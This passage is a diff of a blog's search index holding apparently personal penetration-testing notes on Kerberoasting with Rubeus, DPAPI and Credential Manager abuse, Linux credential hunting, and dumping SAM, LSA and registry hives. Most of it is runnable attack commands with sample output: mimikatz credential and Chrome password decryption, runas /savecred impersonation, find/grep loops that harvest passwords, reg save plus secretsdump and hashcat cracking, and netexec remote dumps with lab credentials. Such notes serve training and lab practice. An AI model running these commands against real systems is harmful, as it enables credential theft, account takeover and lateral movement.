+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; .\Rubeus.exe kerberoast /domain:&lt;CrossDomainName&gt; /user:tar<span class="built_in">get-user</span> /nowrap</span><br></pre></td></tr></table></figure>
+
+
+
+
+]]></content>
+      <categories>
+        <category>Active Directory</category>
+        <category>Windows</category>
+        <category>Exploitation</category>
+        <category>Cross Forest</category>
+        <category>Kerberoasting</category>
+      </categories>
+      <tags>
+        <tag>PowerView</tag>
+        <tag>Rubeus</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>DPAPI</title>
+    <url>/2025/11/26/DPAPI/</url>
+    <content><![CDATA[<h2 id="Default-Location"><a href="#Default-Location" class="headerlink" title="Default Location"></a>Default Location</h2><p>Credentials are stored in special encrypted folders on the computer under the user and system profiles : </p>
+<ul>
+<li><code>%UserProfile%\AppData\Local\Microsoft\Vault\</code></li>
+<li><code>%UserProfile%\AppData\Local\Microsoft\Credentials\</code></li>
+<li><code>%UserProfile%\AppData\Roaming\Microsoft\Vault\</code></li>
+<li><code>%ProgramData%\Microsoft\Vault\</code></li>
+<li><code>%SystemRoot%\System32\config\systemprofile\AppData\Roaming\Microsoft\Vault\</code></li>
+</ul>
+<h2 id="Two-Main-Types-of-Stored-Credentials"><a href="#Two-Main-Types-of-Stored-Credentials" class="headerlink" title="Two Main Types of Stored Credentials:"></a>Two Main Types of Stored Credentials:</h2><h6 id="Web-Credentials"><a href="#Web-Credentials" class="headerlink" title="Web Credentials"></a>Web Credentials</h6><ul>
+<li>Website passwords.</li>
+<li>Online account logins</li>
+</ul>
+<h6 id="Windows-Credentials"><a href="#Windows-Credentials" class="headerlink" title="Windows Credentials"></a>Windows Credentials</h6><ul>
+<li>Network shares (like <code>\\server\share</code>)</li>
+<li>Domain user logins</li>
+<li>Services (OneDrive, etc.)</li>
+<li>Remote desktop connections</li>
+</ul>
+<h2 id="Enumerate-All-vaults"><a href="#Enumerate-All-vaults" class="headerlink" title="Enumerate All vaults"></a>Enumerate All vaults</h2><p><code>➜ they are different, so we need to use both of them :</code></p>
+<p>For standard vaults </p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\sadams&gt; vaultcmd /list</span><br><span class="line"></span><br><span class="line">Currently loaded vaults:</span><br><span class="line"></span><br><span class="line">	Vault: Web Credentials</span><br><span class="line">	Vault Guid:<span class="number">4</span>BF4C442<span class="literal">-9B8A-41A0-B380-DD4A704DDB28</span></span><br><span class="line">	Location: C:\Users\sadams\AppData\Local\Microsoft\Vault\<span class="number">4</span>BF4C442<span class="literal">-9B8A-41A0-B380-DD4A704DDB28</span></span><br><span class="line">	</span><br><span class="line">	Vault: Windows Credentials</span><br><span class="line">	Vault Guid:<span class="number">77</span>BC582B<span class="literal">-F0A6-4E15-4E80-61736B6F3B29</span></span><br><span class="line">	Location: C:\Users\sadams\AppData\Local\Microsoft\Vault</span><br></pre></td></tr></table></figure>
+
+<p>For stored credentials</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Temp&gt; cmdkey /list </span><br><span class="line"></span><br><span class="line">Currently stored credentials: </span><br><span class="line"></span><br><span class="line">Target: WindowsLive: target=virtualapp/didlogical </span><br><span class="line"><span class="built_in">Type</span>: Generic </span><br><span class="line">User: <span class="number">02</span>jejfxhvabjneqt </span><br><span class="line">Local machine persistence </span><br><span class="line"></span><br><span class="line">Target: LegacyGeneric: target=onedrive.live.com </span><br><span class="line"><span class="built_in">Type</span>: Generic </span><br><span class="line">User: mcharles@inlanefreight.local</span><br><span class="line"></span><br><span class="line">Target: Domain:interactive=SRV01\mcharles</span><br><span class="line"><span class="built_in">Type</span>: Domain Password</span><br><span class="line">User: SRV01\mcharles</span><br></pre></td></tr></table></figure>
+
+
+<p>Credentials marked with <code>Local machine persistence</code> survive reboots.</p>
+<h2 id="Enumerate-Specific-vault"><a href="#Enumerate-Specific-vault" class="headerlink" title="Enumerate Specific vault"></a>Enumerate Specific vault</h2><h4 id="Web-Credentials-1"><a href="#Web-Credentials-1" class="headerlink" title="Web Credentials"></a>Web Credentials</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\sadams&gt; vaultcmd /listcreds:<span class="string">&quot;Web Credentials&quot;</span> /all</span><br></pre></td></tr></table></figure>
+
+
+<h4 id="Windows-Credentials-1"><a href="#Windows-Credentials-1" class="headerlink" title="Windows Credentials"></a>Windows Credentials</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\sadams&gt; vaultcmd /listcreds:<span class="string">&quot;Windows Credentials&quot;</span> /all</span><br><span class="line"></span><br><span class="line">Credentials <span class="keyword">in</span> vault: Windows Credentials</span><br><span class="line"></span><br><span class="line">Credential schema: Windows Domain Password Credential</span><br><span class="line">Resource: Domain:interactive=SRV01\mcharles</span><br><span class="line">Identity: SRV01\mcharles</span><br><span class="line"><span class="keyword">Hidden</span>: No</span><br><span class="line">Roaming: No</span><br><span class="line">Property (schema element id, value): (<span class="number">100</span>,<span class="number">3</span>)</span><br></pre></td></tr></table></figure>
+
+<p><code>Important: If the resource includes interactive, the credentials were used in an interactive logon and may be reused to impersonate the user with runas</code>.</p>
+<h2 id="Impersonate-User-In-general-it-doesn’t-need-admin-privilege"><a href="#Impersonate-User-In-general-it-doesn’t-need-admin-privilege" class="headerlink" title="Impersonate User ( In general, it doesn’t need admin privilege )"></a>Impersonate User ( In general, it doesn’t need admin privilege )</h2><p>Since the <code>mcharles</code> credential is associated with an <code>interactive session</code>, we can attempt to impersonate the user using <code>runas</code> :</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">C:\Users\sadams&gt; runas /savecred /user:SRV01\mcharles powershell.exe</span><br><span class="line"></span><br><span class="line">Attempting to <span class="built_in">start</span> cmd as user <span class="string">&quot;SRV01\mcharles&quot;</span> ...</span><br></pre></td></tr></table></figure>
+<p>➜ This will create a new <code>powershell</code> process.</p>
+<h2 id="Dump-Credentials"><a href="#Dump-Credentials" class="headerlink" title="Dump Credentials"></a>Dump Credentials</h2><p>➜ We need <code>Local Administrator access on the machine</code>.</p>
+<h4 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Dump all credentials from Credential Manager</span></span><br><span class="line">sekurlsa::credman</span><br><span class="line"></span><br><span class="line"><span class="comment"># Dump credentials with more details</span></span><br><span class="line">sekurlsa::vault</span><br><span class="line"></span><br><span class="line"><span class="comment"># List all credential vaults</span></span><br><span class="line">dpapi::vault /list</span><br><span class="line"></span><br><span class="line"><span class="comment"># Decrypt specific vault</span></span><br><span class="line">dpapi::vault /<span class="keyword">in</span>:<span class="string">&quot;C:\Users\username\AppData\Local\Microsoft\Vault\GUID\Policy.vpol&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Dump vault credentials</span></span><br><span class="line">dpapi::vault /<span class="keyword">in</span>:vaultfile /masterkey:masterkey</span><br><span class="line"></span><br><span class="line"><span class="comment"># Decrypt Chrome/Edge saved passwords</span></span><br><span class="line">dpapi::chrome /<span class="keyword">in</span>:<span class="string">&quot;C:\Users\username\AppData\Local\Google\Chrome\User Data\Default\Login Data&quot;</span></span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>Active Directory</category>
+        <category>Windows</category>
+        <category>Post-Exploitation</category>
+        <category>Dump-Passwords</category>
+      </categories>
+      <tags>
+        <tag>Dump-DPAPI</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Dump Lsass</title>
     <url>/2025/11/26/Dump-Lsass/</url>
     <content><![CDATA[<h2 id="Create-a-dump-file"><a href="#Create-a-dump-file" class="headerlink" title="Create a dump file"></a>Create a dump file</h2><h3 id="Task-Manager"><a href="#Task-Manager" class="headerlink" title="Task Manager"></a>Task Manager</h3><p>Select the process from task manager </p>
@@ -483,42 +521,41 @@
       </tags>
   </entry>
   <entry>
-    <title>Extracting Passwords from Windows Registry.</title>
-    <url>/2025/11/25/Extracting-Passwords-from-Windows-Systems/</url>
-    <content><![CDATA[<h2 id="Dump-SAM-SYSTEM-And-SECURITY"><a href="#Dump-SAM-SYSTEM-And-SECURITY" class="headerlink" title="Dump SAM, SYSTEM, And SECURITY"></a>Dump SAM, SYSTEM, And SECURITY</h2><h3 id="Offline"><a href="#Offline" class="headerlink" title="Offline"></a>Offline</h3><h4 id="Copy-Registry"><a href="#Copy-Registry" class="headerlink" title="Copy Registry"></a>Copy Registry</h4><p>Key Registry Hives:</p>
-<ul>
-<li><p>HKLM\SAM - Contains local user password hashes</p>
-</li>
-<li><p>HKLM\SYSTEM - Contains boot key to decrypt SAM</p>
-</li>
-<li><p>HKLM\SECURITY - Contains cached domain credentials &amp; LSA secrets</p>
-</li>
-</ul>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">C:\WINDOWS\system32&gt; reg.exe save hklm\sam C:\sam.save</span><br><span class="line"></span><br><span class="line">C:\WINDOWS\system32&gt; reg.exe save hklm\system C:\system.save</span><br><span class="line"></span><br><span class="line">C:\WINDOWS\system32&gt; reg.exe save hklm\security C:\security.save</span><br></pre></td></tr></table></figure>
+    <title>Linux Credential Hunting</title>
+    <url>/2025/11/27/Linux-Credential-Hunting/</url>
+    <content><![CDATA[<h1 id="Linux-Credential-Hunting"><a href="#Linux-Credential-Hunting" class="headerlink" title="Linux Credential Hunting"></a>Linux Credential Hunting</h1><h3 id="Enumerating-history-files"><a href="#Enumerating-history-files" class="headerlink" title="Enumerating history files"></a>Enumerating history files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">tail</span> -n10 /home/*/.bash*</span><br></pre></td></tr></table></figure>
 
-<h4 id="Secretsdump"><a href="#Secretsdump" class="headerlink" title="Secretsdump"></a>Secretsdump</h4><h5 id="Dump-hash"><a href="#Dump-hash" class="headerlink" title="Dump hash"></a>Dump hash</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">impacket-secretsdump -sam sam.save -security security.save -system system.save LOCAL</span><br></pre></td></tr></table></figure>
+<h3 id="Searching-for-configuration-files"><a href="#Searching-for-configuration-files" class="headerlink" title="Searching for configuration files"></a>Searching for configuration files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> l <span class="keyword">in</span> $(<span class="built_in">echo</span> <span class="string">&quot;.conf .config .cnf&quot;</span>);<span class="keyword">do</span> <span class="built_in">echo</span> -e <span class="string">&quot;\nFile extension: &quot;</span> <span class="variable">$l</span>; find / -name *<span class="variable">$l</span> 2&gt;/dev/null | grep -v <span class="string">&quot;lib\|fonts\|share\|core&quot;</span> ;<span class="keyword">done</span></span><br></pre></td></tr></table></figure>
 
-<h5 id="Crack-NT-hash"><a href="#Crack-NT-hash" class="headerlink" title="Crack NT hash"></a>Crack NT hash</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> hashcat -m 1000 hash.txt rockyou.txt</span><br></pre></td></tr></table></figure>
+<h3 id="Searching-for-Passwords-in-Configuration-Files"><a href="#Searching-for-Passwords-in-Configuration-Files" class="headerlink" title="Searching for Passwords in Configuration Files"></a>Searching for Passwords in Configuration Files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> $(find / -<span class="built_in">type</span> f \( -iname <span class="string">&quot;*.txt&quot;</span> -o -iname <span class="string">&quot;*.ini&quot;</span> -o -iname <span class="string">&quot;*.cfg&quot;</span> -o -iname <span class="string">&quot;*.config&quot;</span> -o -iname <span class="string">&quot;*.xml&quot;</span> -o -iname <span class="string">&quot;*.yml&quot;</span> -o -iname <span class="string">&quot;*.yaml&quot;</span> -o -iname <span class="string">&quot;*.cnf&quot;</span> -o -iname <span class="string">&quot;*.conf&quot;</span> -o -iname <span class="string">&quot;*.sh&quot;</span> -o -iname <span class="string">&quot;*.py&quot;</span> -o -iname <span class="string">&quot;*.php&quot;</span> -o -iname <span class="string">&quot;*.git&quot;</span> -o -iname <span class="string">&quot;*.json&quot;</span> \) 2&gt;/dev/null | grep -v <span class="string">&quot;doc\|lib&quot;</span>); <span class="keyword">do</span> <span class="built_in">echo</span> -e <span class="string">&quot;\nFile: <span class="variable">$i</span>&quot;</span>; grep -Ei <span class="string">&quot;password|passphrase|key|username|user account|creds|users|passkeys|configuration|dbcredential|dbpassword|pwd|login|credentials&quot;</span> <span class="string">&quot;<span class="variable">$i</span>&quot;</span> 2&gt;/dev/null | grep -Ev <span class="string">&quot;^\s*#&quot;</span>; <span class="keyword">done</span></span><br></pre></td></tr></table></figure>
 
-<h5 id="Crack-DCC2-hashes"><a href="#Crack-DCC2-hashes" class="headerlink" title="Crack DCC2 hashes"></a>Crack DCC2 hashes</h5><p>➜ Local cache of a domain user’s password, used by Windows to allow login when the Domain Controller is unavailable.</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hashcat -m 2100 <span class="built_in">hash</span> rockyou.txt</span><br></pre></td></tr></table></figure>
 
-<p>➜ This type of hash cannot be used for lateral movement with techniques like Pass-the-Hash.</p>
-<h3 id="Remotely"><a href="#Remotely" class="headerlink" title="Remotely"></a>Remotely</h3><h5 id="netexec"><a href="#netexec" class="headerlink" title="netexec"></a>netexec</h5><p>With <code>local administrator privileges</code> we can dump lsa and sam over the network.</p>
-<p>➜ Dump lsa.</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa</span><br></pre></td></tr></table></figure>
+<h3 id="Searching-for-databases"><a href="#Searching-for-databases" class="headerlink" title="Searching for databases"></a>Searching for databases</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> l <span class="keyword">in</span> $(<span class="built_in">echo</span> <span class="string">&quot;.sql .db .*db .db*&quot;</span>);<span class="keyword">do</span> <span class="built_in">echo</span> -e <span class="string">&quot;\nDB File extension: &quot;</span> <span class="variable">$l</span>; find / -name *<span class="variable">$l</span> 2&gt;/dev/null | grep -v <span class="string">&quot;doc\|lib\|headers\|share\|man&quot;</span>;<span class="keyword">done</span></span><br></pre></td></tr></table></figure>
 
-<p>➜ Dump sam.</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam</span><br></pre></td></tr></table></figure>
-<h3 id="Locally"><a href="#Locally" class="headerlink" title="Locally"></a>Locally</h3><h5 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mimikatz.exe</span><br><span class="line"></span><br><span class="line">mimikatz <span class="comment"># privilege::debug</span></span><br><span class="line"></span><br><span class="line">mimikatz <span class="comment"># lsadump::sam</span></span><br></pre></td></tr></table></figure>]]></content>
+
+<h3 id="Searching-for-scripts"><a href="#Searching-for-scripts" class="headerlink" title="Searching for scripts"></a>Searching for scripts</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> l <span class="keyword">in</span> $(<span class="built_in">echo</span> <span class="string">&quot;.py .pyc .pl .go .jar .c .sh&quot;</span>);<span class="keyword">do</span> <span class="built_in">echo</span> -e <span class="string">&quot;\nFile extension: &quot;</span> <span class="variable">$l</span>; find / -name *<span class="variable">$l</span> 2&gt;/dev/null | grep -v <span class="string">&quot;doc\|lib\|headers\|share&quot;</span>;<span class="keyword">done</span></span><br></pre></td></tr></table></figure>
+
+
+<h3 id="Searching-for-notes"><a href="#Searching-for-notes" class="headerlink" title="Searching for notes"></a>Searching for notes</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find /home/* -<span class="built_in">type</span> f -name <span class="string">&quot;*.txt&quot;</span> -o ! -name <span class="string">&quot;*.*&quot;</span></span><br></pre></td></tr></table></figure>
+
+
+<h3 id="Enumerating-log-files"><a href="#Enumerating-log-files" class="headerlink" title="Enumerating log files"></a>Enumerating log files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> $(<span class="built_in">ls</span> /var/log/* 2&gt;/dev/null);<span class="keyword">do</span> GREP=$(grep <span class="string">&quot;accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs&quot;</span> <span class="variable">$i</span> 2&gt;/dev/null); <span class="keyword">if</span> [[ <span class="variable">$GREP</span> ]];<span class="keyword">then</span> <span class="built_in">echo</span> -e <span class="string">&quot;\n#### Log file: &quot;</span> <span class="variable">$i</span>; grep <span class="string">&quot;accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs&quot;</span> <span class="variable">$i</span> 2&gt;/dev/null;<span class="keyword">fi</span>;<span class="keyword">done</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Enumerating-cronjobs"><a href="#Enumerating-cronjobs" class="headerlink" title="Enumerating cronjobs"></a>Enumerating cronjobs</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/crontab </span><br><span class="line"></span><br><span class="line"><span class="comment"># /etc/crontab: system-wide crontab</span></span><br><span class="line"><span class="comment"># Unlike any other crontab you don&#x27;t have to run the `crontab&#x27;</span></span><br><span class="line"><span class="comment"># command to install the new version when you edit this file</span></span><br><span class="line"><span class="comment"># and files in /etc/cron.d. These files also have username fields,</span></span><br><span class="line"><span class="comment"># that none of the other crontabs do.</span></span><br><span class="line"></span><br><span class="line">SHELL=/bin/sh</span><br><span class="line">PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin</span><br><span class="line"></span><br><span class="line"><span class="comment"># Example of job definition:</span></span><br><span class="line"><span class="comment"># .---------------- minute (0 - 59)</span></span><br><span class="line"><span class="comment"># |  .------------- hour (0 - 23)</span></span><br><span class="line"><span class="comment"># |  |  .---------- day of month (1 - 31)</span></span><br><span class="line"><span class="comment"># |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...</span></span><br><span class="line"><span class="comment"># |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat</span></span><br><span class="line"><span class="comment"># |  |  |  |  |</span></span><br><span class="line"><span class="comment"># *  *  *  *  * user-name command to be executed</span></span><br></pre></td></tr></table></figure>
+
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ls</span> -la /etc/cron.*/</span><br><span class="line"></span><br><span class="line">/etc/cron.d/:</span><br><span class="line">total 28</span><br><span class="line">drwxr-xr-x 1 root root  106  3. Jan 20:27 .</span><br><span class="line">drwxr-xr-x 1 root root 5728  1. Feb 00:06 ..</span><br><span class="line">-rw-r--r-- 1 root root  201  1. Mär 2021  e2scrub_all</span><br><span class="line">-rw-r--r-- 1 root root  331  9. Jan 2021  geoipupdate</span><br><span class="line">-rw-r--r-- 1 root root  607 25. Jan 2021  john</span><br><span class="line">-rw-r--r-- 1 root root  589 14. Sep 2020  mdadm</span><br><span class="line">-rw-r--r-- 1 root root  712 11. Mai 2020  php</span><br><span class="line">-rw-r--r-- 1 root root  102 22. Feb 2021  .placeholder</span><br><span class="line">-rw-r--r-- 1 root root  396  2. Feb 2021  sysstat</span><br><span class="line"></span><br><span class="line">/etc/cron.daily/:</span><br><span class="line">total 68</span><br><span class="line">drwxr-xr-x 1 root root  252  6. Jan 16:24 .</span><br><span class="line">drwxr-xr-x 1 root root 5728  1. Feb 00:06 ..</span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure>]]></content>
       <categories>
         <category>Active Directory</category>
-        <category>Windows</category>
-        <category>Post-Exploitation</category>
-        <category>Dump-Passwords</category>
+        <category>Linux</category>
+        <category>Post Exploitation</category>
+        <category>Credential Hunting</category>
       </categories>
       <tags>
-        <tag>Dump-SAM</tag>
+        <tag>config-files</tag>
+        <tag>history-file</tag>
+        <tag>db-files</tag>
+        <tag>cronjobs-enumeration</tag>
       </tags>
   </entry>
   <entry>
@@ -558,41 +595,42 @@
       </tags>
   </entry>
   <entry>
-    <title>Linux Credential Hunting</title>
-    <url>/2025/11/27/Linux-Credential-Hunting/</url>
-    <content><![CDATA[<h1 id="Linux-Credential-Hunting"><a href="#Linux-Credential-Hunting" class="headerlink" title="Linux Credential Hunting"></a>Linux Credential Hunting</h1><h3 id="Enumerating-history-files"><a href="#Enumerating-history-files" class="headerlink" title="Enumerating history files"></a>Enumerating history files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">tail</span> -n10 /home/*/.bash*</span><br></pre></td></tr></table></figure>
+    <title>Extracting Passwords from Windows Registry.</title>
+    <url>/2025/11/25/Extracting-Passwords-from-Windows-Systems/</url>
+    <content><![CDATA[<h2 id="Dump-SAM-SYSTEM-And-SECURITY"><a href="#Dump-SAM-SYSTEM-And-SECURITY" class="headerlink" title="Dump SAM, SYSTEM, And SECURITY"></a>Dump SAM, SYSTEM, And SECURITY</h2><h3 id="Offline"><a href="#Offline" class="headerlink" title="Offline"></a>Offline</h3><h4 id="Copy-Registry"><a href="#Copy-Registry" class="headerlink" title="Copy Registry"></a>Copy Registry</h4><p>Key Registry Hives:</p>
+<ul>
+<li><p>HKLM\SAM - Contains local user password hashes</p>
+</li>
+<li><p>HKLM\SYSTEM - Contains boot key to decrypt SAM</p>
+</li>
+<li><p>HKLM\SECURITY - Contains cached domain credentials &amp; LSA secrets</p>
+</li>
+</ul>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">C:\WINDOWS\system32&gt; reg.exe save hklm\sam C:\sam.save</span><br><span class="line"></span><br><span class="line">C:\WINDOWS\system32&gt; reg.exe save hklm\system C:\system.save</span><br><span class="line"></span><br><span class="line">C:\WINDOWS\system32&gt; reg.exe save hklm\security C:\security.save</span><br></pre></td></tr></table></figure>
 
-<h3 id="Searching-for-configuration-files"><a href="#Searching-for-configuration-files" class="headerlink" title="Searching for configuration files"></a>Searching for configuration files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> l <span class="keyword">in</span> $(<span class="built_in">echo</span> <span class="string">&quot;.conf .config .cnf&quot;</span>);<span class="keyword">do</span> <span class="built_in">echo</span> -e <span class="string">&quot;\nFile extension: &quot;</span> <span class="variable">$l</span>; find / -name *<span class="variable">$l</span> 2&gt;/dev/null | grep -v <span class="string">&quot;lib\|fonts\|share\|core&quot;</span> ;<span class="keyword">done</span></span><br></pre></td></tr></table></figure>
+<h4 id="Secretsdump"><a href="#Secretsdump" class="headerlink" title="Secretsdump"></a>Secretsdump</h4><h5 id="Dump-hash"><a href="#Dump-hash" class="headerlink" title="Dump hash"></a>Dump hash</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">impacket-secretsdump -sam sam.save -security security.save -system system.save LOCAL</span><br></pre></td></tr></table></figure>
 
-<h3 id="Searching-for-Passwords-in-Configuration-Files"><a href="#Searching-for-Passwords-in-Configuration-Files" class="headerlink" title="Searching for Passwords in Configuration Files"></a>Searching for Passwords in Configuration Files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> $(find / -<span class="built_in">type</span> f \( -iname <span class="string">&quot;*.txt&quot;</span> -o -iname <span class="string">&quot;*.ini&quot;</span> -o -iname <span class="string">&quot;*.cfg&quot;</span> -o -iname <span class="string">&quot;*.config&quot;</span> -o -iname <span class="string">&quot;*.xml&quot;</span> -o -iname <span class="string">&quot;*.yml&quot;</span> -o -iname <span class="string">&quot;*.yaml&quot;</span> -o -iname <span class="string">&quot;*.cnf&quot;</span> -o -iname <span class="string">&quot;*.conf&quot;</span> -o -iname <span class="string">&quot;*.sh&quot;</span> -o -iname <span class="string">&quot;*.py&quot;</span> -o -iname <span class="string">&quot;*.php&quot;</span> -o -iname <span class="string">&quot;*.git&quot;</span> -o -iname <span class="string">&quot;*.json&quot;</span> \) 2&gt;/dev/null | grep -v <span class="string">&quot;doc\|lib&quot;</span>); <span class="keyword">do</span> <span class="built_in">echo</span> -e <span class="string">&quot;\nFile: <span class="variable">$i</span>&quot;</span>; grep -Ei <span class="string">&quot;password|passphrase|key|username|user account|creds|users|passkeys|configuration|dbcredential|dbpassword|pwd|login|credentials&quot;</span> <span class="string">&quot;<span class="variable">$i</span>&quot;</span> 2&gt;/dev/null | grep -Ev <span class="string">&quot;^\s*#&quot;</span>; <span class="keyword">done</span></span><br></pre></td></tr></table></figure>
+<h5 id="Crack-NT-hash"><a href="#Crack-NT-hash" class="headerlink" title="Crack NT hash"></a>Crack NT hash</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> hashcat -m 1000 hash.txt rockyou.txt</span><br></pre></td></tr></table></figure>
 
+<h5 id="Crack-DCC2-hashes"><a href="#Crack-DCC2-hashes" class="headerlink" title="Crack DCC2 hashes"></a>Crack DCC2 hashes</h5><p>➜ Local cache of a domain user’s password, used by Windows to allow login when the Domain Controller is unavailable.</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hashcat -m 2100 <span class="built_in">hash</span> rockyou.txt</span><br></pre></td></tr></table></figure>
 
-<h3 id="Searching-for-databases"><a href="#Searching-for-databases" class="headerlink" title="Searching for databases"></a>Searching for databases</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> l <span class="keyword">in</span> $(<span class="built_in">echo</span> <span class="string">&quot;.sql .db .*db .db*&quot;</span>);<span class="keyword">do</span> <span class="built_in">echo</span> -e <span class="string">&quot;\nDB File extension: &quot;</span> <span class="variable">$l</span>; find / -name *<span class="variable">$l</span> 2&gt;/dev/null | grep -v <span class="string">&quot;doc\|lib\|headers\|share\|man&quot;</span>;<span class="keyword">done</span></span><br></pre></td></tr></table></figure>
+<p>➜ This type of hash cannot be used for lateral movement with techniques like Pass-the-Hash.</p>
+<h3 id="Remotely"><a href="#Remotely" class="headerlink" title="Remotely"></a>Remotely</h3><h5 id="netexec"><a href="#netexec" class="headerlink" title="netexec"></a>netexec</h5><p>With <code>local administrator privileges</code> we can dump lsa and sam over the network.</p>
+<p>➜ Dump lsa.</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa</span><br></pre></td></tr></table></figure>
 
-
-<h3 id="Searching-for-scripts"><a href="#Searching-for-scripts" class="headerlink" title="Searching for scripts"></a>Searching for scripts</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> l <span class="keyword">in</span> $(<span class="built_in">echo</span> <span class="string">&quot;.py .pyc .pl .go .jar .c .sh&quot;</span>);<span class="keyword">do</span> <span class="built_in">echo</span> -e <span class="string">&quot;\nFile extension: &quot;</span> <span class="variable">$l</span>; find / -name *<span class="variable">$l</span> 2&gt;/dev/null | grep -v <span class="string">&quot;doc\|lib\|headers\|share&quot;</span>;<span class="keyword">done</span></span><br></pre></td></tr></table></figure>
-
-
-<h3 id="Searching-for-notes"><a href="#Searching-for-notes" class="headerlink" title="Searching for notes"></a>Searching for notes</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find /home/* -<span class="built_in">type</span> f -name <span class="string">&quot;*.txt&quot;</span> -o ! -name <span class="string">&quot;*.*&quot;</span></span><br></pre></td></tr></table></figure>
-
-
-<h3 id="Enumerating-log-files"><a href="#Enumerating-log-files" class="headerlink" title="Enumerating log files"></a>Enumerating log files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> $(<span class="built_in">ls</span> /var/log/* 2&gt;/dev/null);<span class="keyword">do</span> GREP=$(grep <span class="string">&quot;accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs&quot;</span> <span class="variable">$i</span> 2&gt;/dev/null); <span class="keyword">if</span> [[ <span class="variable">$GREP</span> ]];<span class="keyword">then</span> <span class="built_in">echo</span> -e <span class="string">&quot;\n#### Log file: &quot;</span> <span class="variable">$i</span>; grep <span class="string">&quot;accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs&quot;</span> <span class="variable">$i</span> 2&gt;/dev/null;<span class="keyword">fi</span>;<span class="keyword">done</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="Enumerating-cronjobs"><a href="#Enumerating-cronjobs" class="headerlink" title="Enumerating cronjobs"></a>Enumerating cronjobs</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/crontab </span><br><span class="line"></span><br><span class="line"><span class="comment"># /etc/crontab: system-wide crontab</span></span><br><span class="line"><span class="comment"># Unlike any other crontab you don&#x27;t have to run the `crontab&#x27;</span></span><br><span class="line"><span class="comment"># command to install the new version when you edit this file</span></span><br><span class="line"><span class="comment"># and files in /etc/cron.d. These files also have username fields,</span></span><br><span class="line"><span class="comment"># that none of the other crontabs do.</span></span><br><span class="line"></span><br><span class="line">SHELL=/bin/sh</span><br><span class="line">PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin</span><br><span class="line"></span><br><span class="line"><span class="comment"># Example of job definition:</span></span><br><span class="line"><span class="comment"># .---------------- minute (0 - 59)</span></span><br><span class="line"><span class="comment"># |  .------------- hour (0 - 